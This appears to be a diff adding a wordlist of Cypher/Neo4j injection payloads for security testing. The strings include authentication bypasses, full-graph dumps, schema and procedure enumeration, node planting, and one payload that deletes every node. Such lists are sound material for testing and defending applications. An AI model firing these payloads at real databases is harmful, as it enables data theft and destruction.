@@ -1,0 +1,19 @@
+# Cypher Injection Payloads
+# Each line is a test payload for Cypher/Neo4j injection
+
+' OR 1=1 //
+" OR 1=1 //
+'; MATCH (n) RETURN n //
+' UNION MATCH (n) RETURN n //
+' UNION ALL MATCH (n) RETURN n //
+test') OR 1=1 //
+test') UNION MATCH (n) RETURN n //
+'; MATCH (n) DETACH DELETE n; //
+' MERGE (n:Malicious {data:'pwned'}) RETURN n //
+' CREATE (n:Hack) //
+{name: "' + user.name + '"} // template injection
+$param // parameter pollution
+' WITH 1 as a MATCH (n) RETURN n //
+' CALL db.labels() YIELD label RETURN label //
+' CALL dbms.procedures() YIELD name RETURN name //
+' CALL db.indexes() YIELD description RETURN description //
